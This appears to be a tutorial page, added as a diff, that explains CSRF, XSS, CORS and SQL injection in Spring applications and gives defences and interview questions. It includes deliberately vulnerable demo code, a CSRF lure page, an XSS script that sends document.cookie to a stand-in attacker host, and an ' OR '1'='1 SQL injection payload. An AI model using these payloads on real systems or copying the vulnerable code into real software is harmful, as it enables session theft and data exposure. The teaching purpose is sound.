@@ -1,0 +1,178 @@
+<h1>Common Web Attacks: CSRF, XSS, CORS and SQL Injection</h1>
+<p class="kicker">Before Spring Security: what each attack does, a small demo of how it works, and how to protect against it.</p>
+
+<h2>1. CSRF (Cross-Site Request Forgery)</h2>
+<ul>
+<li>The user is <b>already authenticated</b> to a site.</li>
+<li>A CSRF attack <b>tricks the browser</b> into making an unwanted request to that site, where the user is already logged in; the browser automatically attaches the session cookie.</li>
+<li>Applicable where <b>state and session</b> are managed (cookie-based, stateful authentication).</li>
+</ul>
+<p><b>Demo setup:</b> authentication is mandatory for all endpoints, using session-based (stateful) authentication with a form login. (CSRF protection is switched off here so the attack can be shown; Spring Security turns it on by default.)</p>
+<pre><code class="java">@Configuration
+@EnableWebSecurity
+public class SecurityConfig {
+    @Bean
+    public SecurityFilterChain securityFilterChain(HttpSecurity http) throws Exception {
+        http.sessionManagement(session -&gt; session.sessionCreationPolicy(SessionCreationPolicy.IF_REQUIRED))
+            .csrf(csrf -&gt; csrf.disable())                              // demo only
+            .authorizeHttpRequests(auth -&gt; auth.anyRequest().authenticated())
+            .formLogin(Customizer.withDefaults());
+        return http.build();
+    }
+}
+
+@RestController
+public class BankController {
+    @GetMapping("/transfer")
+    public String transfer(@RequestParam String amount, @RequestParam String to) {
+        return "transferred " + amount + " to " + to;
+    }
+    @GetMapping("/")
+    public String home() { return "hello"; }
+}</code></pre>
+<p>(A real application must never change state with a GET request; <code>/transfer</code> is a GET here only because it makes the demo a one-link attack. With POST the attacker uses a hidden form that auto-submits, and the result is the same without CSRF protection.)</p>
+<ol>
+<li><b>Step 1:</b> the user logs in to the server (the default "Please sign in" form at <code>/login</code>), so the browser holds the session cookie.</li>
+<li><b>Step 2:</b> an attacker sends this user a malicious page or link:</li>
+</ol>
+<pre><code>&lt;!DOCTYPE html&gt;
+&lt;html lang="en"&gt;
+&lt;head&gt;&lt;meta charset="UTF-8"&gt;&lt;title&gt;CSRF Attack Demo&lt;/title&gt;&lt;/head&gt;
+&lt;body&gt;
+  &lt;h2&gt;Click Below to Claim Your Reward!&lt;/h2&gt;
+  &lt;a href="http://localhost:8080/transfer?amount=1000&amp;to=attacker"&gt;
+     &lt;button&gt;Claim My Money&lt;/button&gt;
+  &lt;/a&gt;
+&lt;/body&gt;
+&lt;/html&gt;</code></pre>
+<p>As soon as the user clicks "Claim My Money", the unwanted operation is executed, and the browser <b>appends the cookies (the session)</b> to that request, so the server believes the user did it.</p>
+<div class="flow"><b>User logged in</b><i>session cookie in browser</i><b>Evil page</b><i>request to bank site</i><b>Browser sends cookie</b><i>server accepts</i><b>Money moves</b></div>
+<p><b>How to protect from CSRF:</b></p>
+<ul>
+<li>Use a <b>CSRF token</b>. It ensures the request originates from the legitimate source: the real forms/pages of the site include the token in the request, and the server validates it against the token it created when the HTTP session was created. A forged request from another site does not know the token.</li>
+<li>In Spring Security it is <b>on by default</b> for state-changing requests (POST, PUT, DELETE). For pure stateless token-based APIs (JWT in a header) it is commonly disabled, because the browser does not attach the token automatically.</li>
+<li>Additionally: <code>SameSite</code> cookies (<code>Lax</code>/<code>Strict</code>).</li>
+</ul>
+
+<h2>2. XSS (Cross-Site Scripting)</h2>
+<ul>
+<li>It allows an attacker to <b>put a malicious script into a web page viewed by other users</b>, for example a comments section.</li>
+<li>Commonly used for <b>stealing the session</b> or defacing the website.</li>
+</ul>
+<p><b>Demo:</b> two endpoints:</p>
+<ul>
+<li><code>GET /xss</code> loads all the comments. It returns <code>"xss"</code>; since this is a <code>@Controller</code> (not <code>@RestController</code>), it by default looks for <code>xss.html</code> and renders it.</li>
+<li><code>POST /comment</code> does <b>not sanitise</b> user input; it simply stores the comment (here in a list, in a real app the DB) and displays it on the GET call.</li>
+</ul>
+<p>So if an attacker posts a malicious script, then on every GET the script runs for <b>every user</b> who opens the page.</p>
+<pre><code class="java">@Controller
+public class XssController {
+    private final List&lt;String&gt; comments = new ArrayList&lt;&gt;();
+
+    @GetMapping("/xss")
+    public String xss(Model model) {
+        model.addAttribute("comments", comments);
+        return "xss";
+    }
+
+    @PostMapping("/comment")
+    public String addComment(@RequestParam String comment) {
+        comments.add(comment);
+        return "redirect:/xss";
+    }
+}</code></pre>
+<pre><code>src/main/resources/templates/xss.html
+&lt;!DOCTYPE html&gt;
+&lt;html xmlns:th="http://www.thymeleaf.org"&gt;
+&lt;head&gt;&lt;title&gt;XSS Demo&lt;/title&gt;&lt;/head&gt;
+&lt;body&gt;
+  &lt;h2&gt;Leave a Comment&lt;/h2&gt;
+  &lt;form action="/comment" method="post"&gt;
+    &lt;input type="text" name="comment" required&gt;
+    &lt;button type="submit"&gt;Submit&lt;/button&gt;
+  &lt;/form&gt;
+  &lt;h3&gt;Comments:&lt;/h3&gt;
+  &lt;ul&gt;
+    &lt;li th:each="comment : ${comments}" th:utext="${comment}"&gt;&lt;/li&gt;
+  &lt;/ul&gt;
+&lt;/body&gt;
+&lt;/html&gt;</code></pre>
+<p>The vulnerable part is <code>th:utext</code> (unescaped text): it inserts the comment as raw HTML. With <code>th:text</code>, Thymeleaf escapes it and the attack shows only as harmless text.</p>
+<p>Now insert <code>&lt;script&gt;alert("XSS Attack")&lt;/script&gt;</code> and submit: the script is stored, and when the GET API runs it is returned in the response and the browser executes it (a popup appears for every visitor). A real attacker would add:</p>
+<pre><code>&lt;script&gt;
+  fetch('http://attacker-site/steal?cookie=' + document.cookie);
+&lt;/script&gt;</code></pre>
+<p>Then any user who loads the comment page sends their cookie to the attacker's URL. That cookie holds the <code>JSESSIONID</code>, which the attacker can use to perform unwanted operations on that active session. (Servers normally mark the session cookie <b><code>HttpOnly</code></b>, which hides it from <code>document.cookie</code>; that is one more reason to keep that flag on. XSS can still act on the user's behalf from inside the page.)</p>
+<p><b>How to protect from XSS:</b></p>
+<ul>
+<li><b>Escape user input</b> when rendering (convert special characters like <code>&lt;</code> to <code>&amp;lt;</code>); template engines do this by default, so avoid raw/unescaped output.</li>
+<li><b>Validate</b> the data properly before storing and rendering it.</li>
+<li>Add a Content-Security-Policy header and <code>HttpOnly</code> cookies.</li>
+</ul>
+
+<h2>3. CORS (Cross-Origin Resource Sharing)</h2>
+<p>It is <b>not an attack</b>; it is a browser security feature that restricts web pages from making requests to a <b>different origin</b>, unless the server allows it.</p>
+<p><b>Origin = protocol + domain + port.</b></p>
+<table>
+<tr><th>Client</th><th>Server</th><th>Same origin?</th></tr>
+<tr><td><code>https://localhost:8080</code></td><td><code>http://localhost:8080</code></td><td>No: different protocol</td></tr>
+<tr><td><code>https://localhost:9090</code></td><td><code>https://localhost:8080</code></td><td>No: different port</td></tr>
+<tr><td><code>https://sub.localhost:9090</code></td><td><code>https://localhost:9090</code></td><td>No: different domain (subdomain)</td></tr>
+</table>
+<p>By default, if the client tries to call a server of a different origin, the browser blocks the response. So whenever there is a call between different origins, the <b>server has to allow it</b> by setting the <code>Access-Control-Allow-Origin</code> and related headers.</p>
+<pre><code class="java">@Configuration
+@EnableWebSecurity
+public class SecurityConfig {
+    @Bean
+    public SecurityFilterChain securityFilterChain(HttpSecurity http) throws Exception {
+        http.sessionManagement(session -&gt; session.sessionCreationPolicy(SessionCreationPolicy.IF_REQUIRED))
+            .authorizeHttpRequests(auth -&gt; auth.anyRequest().authenticated())
+            .cors(cors -&gt; cors.configurationSource(request -&gt; {
+                CorsConfiguration config = new CorsConfiguration();
+                config.setAllowedOrigins(List.of("https://sub.localhost:9090"));
+                config.setAllowedMethods(List.of("GET", "POST", "PUT", "DELETE"));
+                config.setAllowedHeaders(List.of("*"));
+                return config;
+            }))
+            .formLogin(Customizer.withDefaults());
+        return http.build();
+    }
+}</code></pre>
+<p>Outside Spring Security you can also use <code>@CrossOrigin(origins = "...")</code> on a controller or a global <code>WebMvcConfigurer.addCorsMappings</code>.</p>
+<div class="box extra"><strong>Good to know</strong>
+<ul>
+<li>CORS is enforced <b>by the browser</b>, not the server; tools like curl or Postman ignore it. It protects the user, not the API.</li>
+<li>For non-simple requests the browser first sends a <b>preflight</b> <code>OPTIONS</code> request asking which methods/headers are allowed.</li>
+<li>Never combine <code>allowCredentials(true)</code> with a wildcard origin; list the exact origins.</li>
+</ul></div>
+
+<h2>4. SQL Injection</h2>
+<p>The attacker <b>manipulates the SQL query</b> by inserting malicious input into a user-supplied field.</p>
+<pre><code class="java">@GetMapping("/find")
+public List&lt;UserDetails&gt; find(@RequestParam String name) {
+    return userDetailsService.findByName(name);
+}
+
+public List&lt;UserDetails&gt; findByName(String name) {
+    String sql = "SELECT * FROM user_details WHERE user_name = '" + name + "'";     // string concatenation
+    return entityManager.createNativeQuery(sql, UserDetails.class).getResultList();
+}</code></pre>
+<p>The table holds two rows (AA, BB). Calling <code>/find?name=AA</code> returns just AA. But calling:</p>
+<pre><code>/find?name=' OR '1' = '1</code></pre>
+<p>makes the query <code>... WHERE user_name = '' OR '1' = '1'</code>, which is always true, and <b>all rows</b> are returned. With other payloads an attacker could read other tables or modify data.</p>
+<p><b>How to protect from SQL injection:</b> use a <b>parameterized query</b>:</p>
+<pre><code class="java">public List&lt;UserDetails&gt; findByName(String name) {
+    String sql = "SELECT * FROM user_details WHERE user_name = :name";
+    return entityManager.createNativeQuery(sql, UserDetails.class)
+                        .setParameter("name", name)
+                        .getResultList();
+}</code></pre>
+<p>Now the same malicious string is treated purely as a <b>value</b>, so it searches for a user literally named <code>' OR '1' = '1</code> and returns nothing. Spring Data derived queries, JPQL with <code>@Param</code> and <code>JdbcTemplate</code> placeholders (<code>?</code>) are all safe in the same way.</p>
+
+<div class="box iq"><strong>Interview corner</strong>
+<details><summary>What is CSRF and how does Spring protect against it?</summary><p>A forged request riding on the victim's authenticated session cookie. Spring Security issues a per-session CSRF token that must accompany state-changing requests.</p></details>
+<details><summary>Do JWT-based stateless APIs need CSRF protection?</summary><p>Usually not, since the token is sent explicitly in the Authorization header and not auto-attached by the browser. If the JWT is stored in a cookie, CSRF becomes relevant again.</p></details>
+<details><summary>Stored vs reflected XSS?</summary><p>Stored: the script is saved (comments) and hits every viewer. Reflected: it comes from a crafted URL and echoes back in one response. Defence: output escaping, validation, CSP.</p></details>
+<details><summary>Same-origin policy and CORS: who enforces them?</summary><p>The browser. The server only declares what origins it allows through CORS headers.</p></details>
+<details><summary>How do you prevent SQL injection?</summary><p>Parameterized queries / prepared statements, ORM bindings, never concatenating input into SQL; least-privilege DB accounts.</p></details>
+</div>
